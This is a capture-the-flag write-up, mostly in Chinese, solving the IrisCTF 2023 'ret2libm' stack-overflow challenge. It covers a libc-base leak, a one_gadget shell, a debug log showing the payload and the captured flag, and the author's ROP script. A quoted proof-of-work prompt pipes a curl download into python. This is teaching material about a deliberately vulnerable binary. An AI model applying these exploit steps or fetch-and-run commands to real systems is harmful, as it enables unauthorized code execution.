# 题目描述

I need to make a pwn? Let's go with that standard warmup rop thing... what was it... ret2libm?

**Hint!** The challenge server may be acting up. If your solution works locally and on the docker but not on remote, please open a ticket!

# Writeup

首先将程序和提供的动态库链接在一起，使用如下命令：

```sh
cp chal chal_patched
patchelf --add-needed libc-2.27.so chal_patched
patchelf --add-needed libm-2.27.so chal_patched
```

然后本地gdb调试chal_patched，可以发现栈溢出到返回指令的偏移量为16；此外可以通过vmmap可以查看libc的地址，然后程序会打印fabs的地址，我们可以算出fabs地址减去libc地址的偏移量，有了这个偏移量就可以在运行时算出动态变化的libc基地址。

然后使用`one_gadget ./libc-2.27.so`找出执行shell的gadget，如下：

```
0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL
```

gdb调试发现main函数结束时这些条件都是满足的，因此可以利用，具体参考脚本[solve.py](solution/solve.py)，远程服务器的输出为：

```
[DEBUG] Received 0xca bytes:
    b'== proof-of-work: enabled ==\n'
    b'please solve a pow first\n'
    b'You can run the solver with:\n'
    b'    python3 <(curl -sSL https://goo.gle/kctf-pow) solve s.ADQ6.AAB/sgG89/DZNgpeagnvNw6S\n'
    b'===================\n'
    b'\n'
    b'Solution? '
Solution: 

[DEBUG] Sent 0xdb bytes:
    b's.AAAkgXoE7EnKZXiLxbSi9OtD0HNPA4RBuSbQQPqvnHkCt9BDoEDQGcTS/eY/LDwM7uHgLhwKrBtdrchKK3htTApNX6Gq+AX0IZAB4QaRXGq9idDScseGokYNuZnBFzFUjvXdEHTjYyxbFB3m26V9PfpEAXULERY2kaMeaRfoS2m9Er/tNmHpxaT3uDuo93lk++flhAqrxUBhBHHu7POwnYAt\n'
continue
[DEBUG] Received 0x3b bytes:
    b'Correct\n'
    b'Check out my pecs: 0x7fdba2f28cf0\n'
    b'How about yours? '
[DEBUG] Sent 0x19 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    00000010  a5 52 b5 a2  db 7f 00 00  0a                        │·R··│····│·│
    00000019
[*] Switching to interactive mode
[DEBUG] Received 0x1c bytes:
    b"Let's see how they stack up."
Let's see how they stack up.$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x15 bytes:
    b'Makefile\n'
    b'chal\n'
    b'chal.c\n'
Makefile
chal
chal.c
$ cat /flag
[DEBUG] Sent 0xa bytes:
    b'cat /flag\n'
[DEBUG] Received 0x20 bytes:
    b'irisctf{oh_its_ret2libc_anyway}\n'
```

***

题目作者的解法和这里介绍的不同，如下：

```python
leak = r.recvuntil(b"\nHow").decode().split("\n")[-2].split(" ")[-1]
leak = eval(leak) - 0x31cf0
print(hex(leak)) # libm base

def p64(i):
    return i.to_bytes(8, byteorder="little")

ADDRAXRDXJUMPRAX = 0x000000000000f39f + leak
POPRAX_RET = 0x000000000001a3c8 + leak
OFFSET = 0x4f2a5 - 0x3ed8c0
OFFSET = OFFSET & (2**64 - 1)

rop = b"aaaabbbbccccdddd"
rop += p64(POPRAX_RET)
rop += p64(OFFSET)
rop += p64(ADDRAXRDXJUMPRAX)

r.sendline(rop)
r.sendline(b"cat /flag")
```

其中OFFSET的含义为，在main函数结束时，RDX的寄存器的值减去0x3ed8c0为libc的基地址，然后加上shell gadget的偏移量0x4f2a5，然后跳到gadget的地址执行指令，这里无法理解的为什么rdx - 0x3ed8c0是libc的基地址，可能要看libc的源码才能知道为什么。

参考链接：

- https://github.com/Seraphin-/ctf/blob/master/irisctf2023/ret2libm.md
- https://thesavageteddy.github.io/posts/ret2libm-iris2023/
- https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/ret2libc
- https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions#64-bit